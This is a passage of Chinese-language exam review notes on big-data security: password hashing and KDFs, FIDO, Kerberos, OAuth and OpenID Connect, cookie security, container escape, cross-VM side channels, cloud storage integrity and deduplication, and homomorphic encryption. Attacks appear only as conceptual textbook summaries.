<p><strong>Q：为什么是上限？</strong>攻击者采用字典攻击，能够以较低的投入破解大多数账号。如果是定向攻击，攻击者在获取攻击目标隐私信息的情况下，就可能发起更有效的字典攻击。</p>
<h2 id="口令如何安全存储？了解主流的口令加密算法。（P87）"><a href="#口令如何安全存储？了解主流的口令加密算法。（P87）" class="headerlink" title="口令如何安全存储？了解主流的口令加密算法。（P87）"></a>口令如何安全存储？了解主流的口令加密算法。（P87）</h2><p>以明文形式将用户名和口令存放在用户数据库中，且攻击者成功获取访问数据库的权限，就可以得到整个用户名和口令表，因此口令一定<strong>不要以明文形式存放，可以将口令加密后再存放在数据库中</strong></p>
<p>（1）最初的口令存储模式，始于1961年MIT的分时系统；在使用中暴漏出很多安全问题，很多用户互相猜测口令，<strong>而且管理员能够有权限解密用户的口令</strong>。</p>
<p>（2）60年代，剑桥大学的Roger Needham和Mike Guy<strong>发明利用哈希算法来加密口令的方法</strong>，并将之应用于MULTICS操作系统。通过哈希算法的保护，服务器不再保存用户的原始口令；即使是系统管理员，也只能通过破解哈希算法来获得用户的口令。利用安全哈希算法的单向特性，用户口令的安全性得到很大提升。</p>
<p>（3）由于计算机的普及，很多攻击者具有更强大的计算能力。1979年，Robert Morris和Ken Thompson<strong>提出了哈希加盐的方法，来抵抗字典攻击和暴力破解，并应用于Unix操作系统。（P90）</strong></p>
<p>（4）更安全的方法：<strong>KDFs算法中都有个因子，</strong>用于指明计算密码摘要所需要的资源和时间，也就是计算强度。计算强度越大，攻击者建立rainbowtable越困难，以至于不可继续。</p>
<p>（5）PBKDF2：<strong>将salted hash进行多次重复计算。</strong></p>
<p>BCRYPT：有一个参数，<strong>可用于调整计算强度</strong>，而且work factor是包括在输出的摘要中的。随着攻击者计算能力的提高，使用者可以逐步增大work factor，而且不会影响已有用户的登陆。</p>
<p>SCRYPT：<strong>SCRYPT不仅计算所需时间长，而且占用的内存也多，</strong>使得并行计算多个摘要异常困难，因此利用rainbow table进行暴力攻击更加困难。</p>
<p>总结常用的口令加密算法：<strong>哈希加盐、KDFs、PBKDF2、BCRYPT、SCRYPT、Argon2…</strong></p>
<h2 id="解释FIDO协议的工作原理（P96-具体看课本）"><a href="#解释FIDO协议的工作原理（P96-具体看课本）" class="headerlink" title="解释FIDO协议的工作原理（P96+具体看课本）"></a>解释FIDO协议的工作原理（P96+具体看课本）</h2><p>（1）一套<strong>在线快速身份认证标准</strong>，主要包含<strong>UAF和U2F两套协议</strong>，以<strong>非对称算法</strong>为基础，支持多种验证方式。</p>
<p>（2）FIDO协议<strong>最基本的技术特征就是本地身份识别与在线身份认证相结合</strong>，而<strong>在线身份认证技术则采用非对称公私钥对来提供安全保障。</strong></p>
<p>UAF：<strong>支持指纹、语音、虹膜、脸部识别等生物身份识别方式。</strong>无需用户密码介入，直接进行认证；（比如手机银行——人脸识别！）</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%207.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%208.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%209.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2010.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2011.png" alt="image.png"></p>
<p>U2F：支持U盾、NFC芯片、TPM等硬件设备，<strong>使用双因子（密码和硬件设备）保护用户账户和隐私。</strong>用户在注册阶段，使用服务器支持的加密设备，将账户和设备绑定。（P100）</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2012.png" alt="image.png"></p>
<p><strong>Q：口令如何管理？</strong>减少需要记忆的口令的数量：SSO，一次性口令。利用PM：自动化管理，不需要记忆口令。</p>
<p><strong>Q：认证凭证（秘密）如何管理？</strong></p>
<p>生物特征的应用：FIDOUAF，是否存在个人生物特征敏感信息的泄漏？</p>
<p>FIDO U2F：设备遗失问题；用户体验：你愿意每天多带一个设备吗？如果忘记了，就无法登录你的账号</p>
<p>以风险为基础的模型：分类器<strong>可以利用口令以外的许多信号，与口令不同，这些隐式信息是可用的，</strong>用户无需付出额外的努力。虽然这些信号都不是不可伪造，但在实践中伪造所有信号的难度还是很大的。一些问题：<strong>任何分类器将不可避免地产生错误接受（FalseAccept）和错误拒绝（FalseReject）的错误。</strong></p>
<p>持续认证：持续认证是指<strong>分类器不只是在入口处检查口令</strong>，而是可以在<strong>允许用户进入后监视用户的行为</strong>，并根据这些附加信号改进其决策，实现动态的访问控制。</p>
<p>单点登录SSO：是指在多系统应用群中登录一个系统，便可在其他所有系统中得到授权而无需再次登录，用户<strong>只需登陆一次即可访问相互信任的子系统。</strong></p>
<h2 id="Kerberos协议的工作原理（P107）"><a href="#Kerberos协议的工作原理（P107）" class="headerlink" title="Kerberos协议的工作原理（P107）"></a>Kerberos协议的工作原理（P107）</h2><p>该协议的基础是Needham-Schroeder协议，该协议引入了KDC（密钥分发中心）的概念，通信各方分别与KDC共享一个长期密钥，KDC产生通信中需要的会话密钥，同时解决用户和服务的双向身份认证问题。</p>
<p>Kerberos协议<strong>基于对称密码体制</strong>，每个用户U和对称密钥分发中心KDC共享一个秘密的DES密钥，记为Ku。KDC作为客户端和服务器共同信任的第三方，维护着管理域中所有安全主体账户信息数据库。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2013.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2014.png" alt="image.png"></p>
<p>优势：实现了<strong>一次性签放</strong>的机制，并且签放的票据都有一个有效期；支持<strong>双向</strong>的身份认证；支持分布式网络环境下的域间认证。<strong>用户只需登录一次</strong>，即可访问相互信任的子系统。</p>
<h2 id="OAuth协议的工作原理（P108）"><a href="#OAuth协议的工作原理（P108）" class="headerlink" title="OAuth协议的工作原理（P108）"></a>OAuth协议的工作原理（P108）</h2><p>（1）所谓OAuth（即Open Authorization，开放授权），<strong>第三方无需知道用户的账号及密码，就可获取到用户的授权信息。</strong>允许第三方网站在用户授权的前提下访问用户在服务商那里存储的各种信息。并且这种授权无需用户将认证信息提供给该第三方网站。OAuth允许用户提供一个令牌给第三方网站，<strong>一个令牌对应一个特定的第三方网站</strong>，同时该令牌只能在特定的时间内访问特定的资源。OAuth协议<strong>不仅能够实现单点登录资源开放</strong>，而且能够让资源所有者细粒度地控制对资源的授权，能够知道是谁访问了哪些资源以及访问量。OAuth 2.0 的标准是RFC6749 文件（October2012）。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2015.png" alt="image.png"></p>
<p>（2）四种角色：<strong>资源所有者；客户端；授权服务器；资源服务器</strong> </p>
<p>（3）名词解释：</p>
<p><strong>用户：资源所有者，即用户。</strong>User Agent：用户代理。比如浏览器、手机App。</p>
<p><strong>RP：依赖方。</strong>Client：客户端（第三方应用Third-party application）。</p>
<p><strong>IdP ：身份提供方或者服务提供方。</strong>Authorization server：授权（认证）服务器。即服务提供商专门用来处理认证的服务器。Resource server：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。</p>
<p><strong>Access Token：访问令牌。</strong>使用合法的访问令牌获取受保护的资源。</p>
<p>（4）用户授权有四种模式：<strong>授权码模式，简化模式，密码模式，客户端模式。</strong>（P111）</p>
<p>授权码模式，指的是<strong>第三方应用先申请一个授权码，然后再用该码获取令牌。</strong>这种方式是<strong>最常用的流程，安全性也最高，</strong>它适用于那些有后端的Web应用。<strong>授权码通过前端传送，令牌则是储存在后端</strong>，而且所有与资源服务器的通信都在后端完成。这样的前后端分离，可以避免令牌泄漏。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2016.png" alt="image.png"></p>
<p>（账号）<strong>注册阶段</strong>：<strong>包括RP、用户在IdP的注册及与IdP的绑定。</strong>在RP可以与IdP交互之前，RP需要在IdP注册，<strong>实际上，这个过程通常是手工完成的。</strong>随后，用在IdP的账号在RP完成认证。最后，将RP账号和IdP账号进行绑定。<strong>（注册+认证+绑定）</strong></p>
<p><strong>认证阶段：</strong>获得授权码，换取Access Token。</p>
<h2 id="OpenID-Connect协议的工作原理（P113）"><a href="#OpenID-Connect协议的工作原理（P113）" class="headerlink" title="OpenID Connect协议的工作原理（P113）"></a>OpenID Connect协议的工作原理（P113）</h2><p>OAuth 2.0协议是一种最广泛部署授权&#x2F;单点登录(SSO)协议，也是新的SSO标准OpenIDConnect的基础。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2017.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2018.png" alt="image.png"></p>
<p>OpenID Connect协议与OAuth 2.0协议流程基本相同，<strong>主要区别是身份鉴别请求中添加openid参数</strong>，身份服务提供方（IdP）最终会发送<strong>给依赖方一个JWT格式的身份令牌而不是访问令牌。</strong>访问令牌主要区别在于：访问令牌只是一个随机字符串，而<strong>身份令牌则携带了依赖方、服务提供方、用户等信息并进行了签名。</strong>相较于OAuth2.0协议更适合用于用户身份鉴别</p>
<p><strong>移动端单点登陆系统</strong></p>
<p>问题：缺少在传统方式中作为可信基的浏览器</p>
<p>一般采用2种方式在移动端模拟浏览器的重定向：（1）在依赖方应用中使用WebView来完成重定向；（2）使用APP间的消息传递机制来代替重定向。该方法的问题是，应用间消息传递时无法对接收方以及发送方进行身份鉴别</p>
<h2 id="Cookie的工作原理与安全属性（P116）"><a href="#Cookie的工作原理与安全属性（P116）" class="headerlink" title="Cookie的工作原理与安全属性（P116）"></a>Cookie的工作原理与安全属性（P116）</h2><p>（1）工作原理：当用户访问一个网站时，<strong>web服务器设置cookie属性</strong>(即、名称、值、标志、过期日期和匹配规则)。设置的方式可以是<strong>静态地使用Set-Cookie，也可以使用JavaScript。</strong>当用户发出HTTP或HTTPS请求时，<strong>浏览器将发送cookie</strong>，<strong>其匹配规则对应于请求的URL和协议</strong>。浏览器不会在常规HTTP连接上传输带有HTTPS属性的cookie。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2019.png" alt="image.png"></p>
<p>（2）安全属性：</p>
<p>访问控制：｛域名，目录，时间｝，<strong>HTTPOnly，Secure</strong>（HTTPS），SameSite</p>
<p>Cookie的HttpOnly属性，<strong>指浏览器不要在除HTTP和HTTPS请求之外暴露Cookie</strong>。一个有HttpOnly属性的Cookie，不能通过非HTTP方式来访问，例如通过调用JavaScript(例如，引用document.cookie)，因此，不可能通过跨域脚本（XSS）来偷走这种Cookie。Facebook和Google正在广泛地使用HttpOnly属性。</p>
<p>Secure Cookie机制指的是<strong>设置了secure标志的cookie</strong>。Secure Cookie<strong>仅在https层面上安全传输</strong>，如果是http请求，就不会带上这个cookie。这样能降低重要的cookie被中间人截获的风险。</p>
<h2 id="身份认证Cookie（P117）"><a href="#身份认证Cookie（P117）" class="headerlink" title="身份认证Cookie（P117）"></a>身份认证Cookie（P117）</h2><p>（1）除了维护用户的状态外，<strong>网站还使用cookie对用户进行身份验证。Auth-cookies：</strong>当用户最初向web服务器进行身份验证时，web服务器将设置多个authcookie。<strong>Auth-cookies</strong>确保在连接中断的情况下(例如，由于TCP会话终止或用户IP地址的更改)，用户的会话保持连续。许多网站<strong>使用不同的auth-cookies组合来控制对网站不同部分的访问</strong>(例如，填写购物车的用户可能需要一组不同于在购物车中购买商品的cookies)。</p>
<p>（2）最初使用<strong>用户名和密码登录网站的用户</strong>随后可以简单地提供身份验证cookie(auth-cookies)来访问该网站。因此，一旦用户对web服务器进行了身份验证，auth-cookie就是一个关键的安全节点（linchpin）：在许多情况下，<strong>对这些auth-cookie的访问使攻击者能够完全控制用户的帐户。</strong></p>
<h2 id="Cookie劫持攻击的工作原理（P118）"><a href="#Cookie劫持攻击的工作原理（P118）" class="headerlink" title="Cookie劫持攻击的工作原理（P118）"></a>Cookie劫持攻击的工作原理（P118）</h2><p>（1）被动攻击：对手监视公共无线网络的流量，例如大学校园或咖啡店的流量。<strong>用户连接到无线网络以浏览网页</strong>。浏览器将用户的HTTP cookie附加到通过未加密连接。<strong>以明文形式发送的请求</strong>。窃听者正在监视流量，窃听者从网络跟踪中提取用户的HTTP cookie，并使用被窃取的cookie连接到易受攻击的服务。这些服务<strong>从cookie中“识别”用户并提供网站的个性化版本</strong>，从而将用户的个人信息和帐户功能暴露给对手。</p>
<p>（2）主动攻击：拦截未加密的auth cookie的on-path攻击者。</p>
<p>例如，即使用户没有明确访问那些网站，攻击者也可以注入内容以迫使用户的浏览器向特定的易受攻击的网站发送请求并公开用户的Cookie。</p>
<p>HSTS如何影响HTTP cookie劫持：部分部署使该机制无效，因为单个未加密的连接可能足以使攻击者获取所需的cookie。</p>
<h1 id="大数据存储与计算的安全隐私"><a href="#大数据存储与计算的安全隐私" class="headerlink" title="大数据存储与计算的安全隐私"></a>大数据存储与计算的安全隐私</h1><p><strong>（P127）</strong>云计算的定义：云计算是一种模式，能以泛在的、便利的、按需的方式通过网络访问可配置的计算资源（例如网络、服务器、存储器、应用和服务），这些资源可实现快速部署与发布，并且只需要极少的管理成本或服务提供商的干预。</p>
<p>云计算有五大特征：按需获得的自助服务；广泛的网络接入方式；资源的规模池化；快捷的弹性伸缩；可计量的服务</p>
<p>云计算的目标：在于把无数个节点<strong>整合</strong>成一个具有强大计算能力的分布式计算系统，通过互联网把强大的计算能力<strong>提供</strong>给终端用户。</p>
<p><strong>云计算三种主要服务模式：SaaS、PaaS、IaaS</strong></p>
<p>基于云存储技术的SaaS服务，优点有：1）海量存储资源；2）可靠性高，数据永不丢失；3）催生新的技术，例如，“秒传”功能；4）以较低廉的价格获得海量的存储能力</p>
<p>安全问题势必要被考虑：<strong>数据完整性、数据隐私保护、数据安全防护</strong></p>
<h2 id="虚拟化技术：虚拟机，容器的三个核心概念与核心技术（P128）"><a href="#虚拟化技术：虚拟机，容器的三个核心概念与核心技术（P128）" class="headerlink" title="虚拟化技术：虚拟机，容器的三个核心概念与核心技术（P128）"></a>虚拟化技术：虚拟机，容器的三个核心概念与核心技术（P128）</h2><p><strong>虚拟化技术作为云计算的基础技术之一，在云服务系统中发挥了不可替代的作用。</strong></p>
<p>从服务提供方视角来看，<strong>虚拟化技术有助于提高资源的利用率</strong>。从用户的视角，提供一个共享的资源池，降低用户的总拥有成本、系统部署和维护的时间成本，给用户提供既方便又便宜的（计算、存储、通信）服务。成本更低，用户体验更好，是虚拟化技术得以迅猛发展的根本驱动力。</p>
<p>（1）虚拟机：（P129）</p>
<p><strong>虚拟机技术是云计算系统提高计算资源利用率的重要技术手段。</strong>云计算系统通过虚拟化技术，可以构建一个超大规模的资源池；对于每个租用者，可以根据需要动态地为其分配资源和释放资源，不需要按照峰值预留资源。</p>
<p><strong>计算虚拟化技术的实现形式，是在系统中加入一个虚拟化层，将下层资源抽象成另一种形式的资源，供上层调用。</strong>计算虚拟化软件，需要模拟出来的逻辑功能，主要为高效独立的虚拟计算机系统，我们称之为虚拟机。在虚拟机中运行的操作系统软件，我们称之为，Guest-OS。</p>
<p>（2）容器：（P131）</p>
<p>与传统虚拟化等技术相比，容器技术在生产应用中优势明显。相比虚拟化技术，<strong>容器技术具有部署便捷、管理便利、利于微服务架构的实现、弹性伸缩、高可用等特点。</strong></p>
<p><strong>镜像：文件的层次结构，以及包含如何运行容器的元数据，</strong>Dockerfile中的每条命令都会在文件系统中创建一个新的层次结构，文件系统在这些层次上构建起来，镜像就构建于这些联合的文件系统之上。</p>
<p><strong>仓库：</strong>仓库是集中存放镜像文件的场所，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签。</p>
<p><strong>容器：</strong>容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。<strong>可以把容器看做是一个简易版的Linux环境，Docker利用容器来运行应用。</strong></p>
<p>容器技术的实现依赖于三个核心技术<strong>：隔离机制，资源配额，虚拟文件系统</strong></p>
<p>隔离机制：将容器的进程、网络、消息、文件系统隔离开，给每个容器创建一个独立的命名空间。</p>
<p>资源配额：实现了对资源的配额和度量。</p>
<p>Linux容器提供了一种操作系统级的虚拟化方法，借助于namespace的隔离机制和Cgroups限额功能来管理container。</p>
<p><strong>虚拟机的操作系统是运行在宿主机操作系统之上的，而容器是与宿主机共享一个操作系统</strong></p>
<p><strong>（3）容器与虚拟机的对比：（P133）</strong>一般来讲，虚拟机的操作系统是运行在宿主机操作系统之上的，而容器是与宿主机共享一个操作系统。</p>
<p>虚拟机镜像庞大；而容器镜像小，<strong>便于存储和传输</strong>。</p>
<p>虚拟机需要<strong>消耗更多的CPU和内存</strong>，容器几乎没有额外的性能损失。</p>
<p>虚拟机部署速度慢，启动需要10秒以上；<strong>而容器启动速度快，</strong>以Docker为例，一般是秒级的速度。</p>
<p><strong>但是容器安全性比虚拟机低。</strong></p>
<h2 id="三类容器安全问题：容器逃逸，镜像安全，集群入侵。（P136）"><a href="#三类容器安全问题：容器逃逸，镜像安全，集群入侵。（P136）" class="headerlink" title="三类容器安全问题：容器逃逸，镜像安全，集群入侵。（P136）"></a>三类容器安全问题：容器逃逸，镜像安全，集群入侵。（P136）</h2><p>（1）容器逃逸：安全人员最关注的是容器逃逸问题。指的是攻击者通过劫持容器化业务逻辑或直接控制等方式，已经获得容器内某种权限下的命令执行能力的过程和结果。</p>
<p>（2）镜像安全：研发人员更关注镜像安全问题</p>
<p>（3）集群入侵：集群入侵是运维人员最关注的容器安全问题</p>
<h2 id="造成容器逃逸的两类原因（软件漏洞与错误配置）与缓解措施（与主机系统隔离，构建更强的信任边界）（P136）"><a href="#造成容器逃逸的两类原因（软件漏洞与错误配置）与缓解措施（与主机系统隔离，构建更强的信任边界）（P136）" class="headerlink" title="造成容器逃逸的两类原因（软件漏洞与错误配置）与缓解措施（与主机系统隔离，构建更强的信任边界）（P136）"></a>造成容器逃逸的两类原因（软件漏洞与错误配置）与缓解措施（与主机系统隔离，构建更强的信任边界）（P136）</h2><p>docker容器逃逸指的是攻击者<strong>通过劫持容器化业务逻辑或直接控制等方式</strong>，已经获得容器内某种权限下的命令执行能力的过程和结果；因为docker使用的是隔离技术，因此容器内的进程无法看到外面的进程，但外面的进程可以看到里面，<strong>所以如果一个容器可以访问到外面的资源，甚至是获得了宿主主机的权限，这就叫做“Docker逃逸”。</strong></p>
<p><strong>（1）由于内核漏洞引起的逃逸</strong>。 因为Docker是直接共享的宿主主机内核，所以当宿主主机的内核存在安全漏洞时会一并影响Docker的安全，导致可能会造成Docker逃逸。</p>
<p><strong>（2）由于Docker软件设计引起的逃逸。</strong>比较典型的例子是Docker的标准化容器执行引擎runc。其漏洞原理是，Docker、Containerd或其他基于runc的容易在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取到宿主机runc执行文件时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限，造成Docker逃逸。</p>
<p>（3）除了经<strong>由软件漏洞</strong>进行的攻击之外，<strong>由错误的配置</strong>带来的容器逃逸攻击更为常见。例如部署一个具备过高权限的容器，或者关键挂载点都可能引发容器逃逸。在多租户集群中部署容器、或者把包含有敏感数据的容器和其它不受信容器部署在同一主机上，就要考虑一下发生灾难性后果的可能性。</p>
<p>具体的解决方式就是<strong>创建一个真正的沙箱容器，尽可能的从主机操作系统中隔离开来。</strong>多数解决方案都是一种混合架构，在虚拟机的强信任边界和容器的高效率之间尝试取得平衡。</p>
<h2 id="跨虚拟机的攻击与云计算环境下的安全挑战（P139）"><a href="#跨虚拟机的攻击与云计算环境下的安全挑战（P139）" class="headerlink" title="跨虚拟机的攻击与云计算环境下的安全挑战（P139）"></a>跨虚拟机的攻击与云计算环境下的安全挑战（P139）</h2><p><strong>Q：由于多个用户的虚拟机共享一台物理机，那么，是否虚拟用户A有可能获得同一台机器上的虚拟用户B的隐私数据呢？</strong></p>
<p>在该论文（CCS’12）发表之前，一般认为由于CPU和内存的虚拟化，以及当时云平台普遍采用的多核CPU架构，攻击者很难进行跨虚拟机的微架构侧信道攻击来窃取私钥信息。<strong>该论文的核心贡献是在跨虚拟机场景下首次实现了能够提取数字签名私钥的微架构侧信道攻击。</strong>实验表明，攻击者可以通过几个小时的侧信道信息采集，实现对4096比特安全强度的ElGamal数字签名私钥的窃取过程。</p>
<p>文章提出了一种<strong>动态规划算法，通过侧信道</strong>对被攻击VM的多次数字签名过程进行攻击，收集足够多的候选代码“序列”，利用动态规划算法将SVM+HMM输出的多个代码路径片段“缝合”在一起，从而构建更完整的代码“序列”。</p>
<p><strong>Q：由于多个用户的虚拟机共享一台物理机，那么，是否虚拟用户A有可能获得同一台机器上的虚拟用户B的隐私数据呢？</strong></p>
<p>两种攻击模式：一种被称为<strong>Meltdown（熔断）</strong>，是在用户态攻击内核态，造成内核信息泄露。</p>
<p>另一种被称为<strong>Spectre（幽灵）</strong>，一个应用可以突破自己的沙盒限制，获取其他应用的信息。</p>
<p><strong>Q：云计算这种新的计算环境安全可信吗？</strong></p>
<p>威胁模型：入侵云服务提供商服务器的黑客；云服务提供商的内部攻击者；恶意用户；</p>
<p><strong>Q：挑战（新需求）：如何在不可信的环境下完成计算？</strong></p>
<p>解决方案：<strong>SGX；同态加密；安全多方计算</strong></p>
<p><strong>Q：传统的方式如何提高文件系统的可靠性并实现容错？</strong></p>
<p>镜像，RAID5，【Scale Up，增强单节点的可靠性】</p>
<p><strong>Q：云计算与传统的客户服务器架构的区别？（P155）例如，云盘和传统的FTP服务有什么不同？</strong></p>
<p>相对于传统文件存储服务，云盘具有以下特点：<strong>海量存储资源，</strong>虚拟为一个“云盘”；云盘可以被视为是一个超大容量的免费网络U盘；可靠性高，数据永不丢失；海量数据资源池，催生新的技术，例如，“秒传”功能；这些技术让用户获得了很好的用户体验。云盘，改变了我们存放文件的习惯，提供了更好的用户体验。但是，也带来了一个新的问题，那就是安全！</p>
<h2 id="大数据存储的数据完整性机制：POR（P156）"><a href="#大数据存储的数据完整性机制：POR（P156）" class="headerlink" title="大数据存储的数据完整性机制：POR（P156）"></a>大数据存储的数据完整性机制：POR（P156）</h2><p>安全威胁模型：外部入侵者<strong>有能力攻击云服务器并且损坏其中的数据，却不被发现</strong>；云服务器在多数情况下是不会破坏数据的，但是为了自身的利益，也可能删除服务器中长时间不用的数据，以此减轻负担和开支，也有可能发现数据被外部入侵者损坏，<strong>却对数据所有者隐瞒实情</strong>，以此来维护自己的名誉。</p>
<p>POR的验证机制需要解决以下两个问题：<strong>更有效地识别外包文件中出现的损坏。能恢复已损坏的数据文件。</strong></p>
<p>基本的思路是<strong>通过增加验证信息来提高验证的效率，并运用纠错编码技术来恢复被损坏的数据。</strong></p>
<p>针对第一个问题，<strong>可以在外包的文件中预先植入一些称之为岗哨位的检验数据块，并在本地存储好这些检验数据块。</strong>对于远程服务器而言，这些岗哨数据块与数据块是无法区分的；倘若服务器损坏了数据文件中部分内容，也会相应地损坏到岗哨文件块。对比存储在本地的检验数据，能判断远程节点上的数据是否是完整的。另外通过岗哨块损坏的数目，可以评估文件中出错的部分在整个文件中所占的比例。</p>
<p>针对第二个问题，<strong>通常利用RS纠错码对文件进行容错预处理</strong>，使用纠错机制可以恢复一部分损坏的数据。</p>
<h2 id="大数据存储的数据隐私保护机制（加密数据去重技术）（P157）"><a href="#大数据存储的数据隐私保护机制（加密数据去重技术）（P157）" class="headerlink" title="大数据存储的数据隐私保护机制（加密数据去重技术）（P157）"></a>大数据存储的数据隐私保护机制（加密数据去重技术）（P157）</h2><p>大规模云存储系统往往面临两个矛盾的需求：<strong>一方面系统需要压缩数据以节省存储空间的开销；另一方面，用户出于数据安全和隐私的考虑，希望自己的数据加密存储。</strong></p>
<p>但是去重却是和数据加密的目标直接相矛盾的。加密之后的密文需要保留原文的冗余，即原文相同的数据块加密后的密文仍相同（这里的相同不一定是密文的全等，系统只要一种识别包含相同内容的密文的手段即可），这样去重才能够起作用。但是，它与加密算法的安全性定义有不可调和的矛盾。Semantic security明确禁止原文相等性的检测，即给定两个密文，不应该能够允许对手断定它们加密的是否是同样的数据，否则对手可以利用这一性质攻破前述IND。可以明确断言的是，满足现代加密算法安全性（如semantic security）的所有加密算法都不支持去重。<br><strong>于是退而求其次，即我们可以适度放宽对安全性的要求，允许密文泄露原文相等性信息，从而使加密后的去重成为可行</strong></p>
<p><strong>方案一：收敛加密（CE）</strong></p>
<p>数据块d的加密为：E(hash(d),d)，其中第一个参数为密钥key，方法选用一个对称加密算法如AES。可以认为，h(x)输出的一部分作为key，另外一部分作为算法所需的随机数如IV。这样，同样的数据块一定会被加密成同样的密文，后续可以做去重。</p>
<p><strong>方案二：消息锁定加密（MLE）</strong>，它使用的key是从待加密的原文算出来的。CE是MLE的一种特例，CE和MLE满足PRV$-CDA，比其他相关的安全性都更强。</p>
<h2 id="大数据存储的数据安全防护机制：PoW（P158）"><a href="#大数据存储的数据安全防护机制：PoW（P158）" class="headerlink" title="大数据存储的数据安全防护机制：PoW（P158）"></a>大数据存储的数据安全防护机制：PoW（P158）</h2><p>PoW就是在服务器和客户端之间执行一个挑战&#x2F;响应的协议，它能够有效地预防攻击者通过单一哈希值去获取整个文件。在该模型中他们提出了一个<strong>基于文件级的去重方案，</strong>主要使用纠错码对文件进行编码，同时利用Merkle哈希树方法进行文件拥有权证明。</p>
<p>当数据块很多时，构造的Merkle哈希树高度很大，不利于计算和验证效率。为了进一步提高验证效率，DI等人提出了一个高效的拥有权证明方案，<strong>命名为s-PoW</strong>，该方案通过随机选择一些比特位作为文件拥有权证明证据，这只需要一个常量的计算开销。</p>
<p><strong>Q：比较云盘和传统服务器：</strong></p>
<p>（1）访问方式不同。云盘通过网络，网页访问；服务器要客户端软件访问特定IP端口等；</p>
<p>（2）数据存储位置不同。数据存储在云端，多个物理存储位置；存储在特定的物理服务器上；</p>
<p>（3）可扩展性。用户可以根据需要随时增加或减少存储容量；受限于物理服务器的硬件配置！</p>
<h1 id="保护隐私的可信计算"><a href="#保护隐私的可信计算" class="headerlink" title="保护隐私的可信计算"></a>保护隐私的可信计算</h1><h2 id="同态加密的概念；为什么需要同态加密技术？（P163）"><a href="#同态加密的概念；为什么需要同态加密技术？（P163）" class="headerlink" title="同态加密的概念；为什么需要同态加密技术？（P163）"></a>同态加密的概念；为什么需要同态加密技术？（P163）</h2><p><strong>我们可以对输入的加密内容进行某种运算，生成新的加密数据，而当解密的时候，所解密出的明文内容，与我们输入明文内容进行运算后得到的结果是一致的。</strong>利用同态加密算法，云端服务器<strong>不用解密就可以处理敏感数据。</strong>可以解决云计算混乱的数据安全现状，而且不会在云环境中出现任何明文数据。同态加密，有可能彻底解决云计算的数据安全问题！</p>
<p>记加密操作为E，明文为m，加密得c，即c&#x3D;E(m)，m&#x3D;D(c)。已知针对明文有操作f，针对E可构造F，使得F(c)&#x3D;E(f(m))，这样E就是一个针对f 的同态加密算法。假设f是个很复杂的操作，有了同态加密，我们就可以把加密得到的c交给第三方，第三方进行操作F，我们拿回F(c)后，一解密，就得到了f(m)。第三方替我们干了活，对m却仍一无所知，多么融洽的关系啊。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2020.png" alt="image.png"></p>
<p>Why？如果数据只是简单地被存储起来，那么传统的加密技术就可以非常完美地工作。而当你真的需要处理和分析被存储起来的数据时，问题就出现了。<strong>数据在加密之后，如果要想对数据进行运算，就必须先解密，这样增加了数据的不安全因素</strong></p>
<h2 id="乘法同态加密算法：RSA（P163）"><a href="#乘法同态加密算法：RSA（P163）" class="headerlink" title="乘法同态加密算法：RSA（P163）"></a>乘法同态加密算法：RSA（P163）</h2><p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2021.png" alt="image.png"></p>
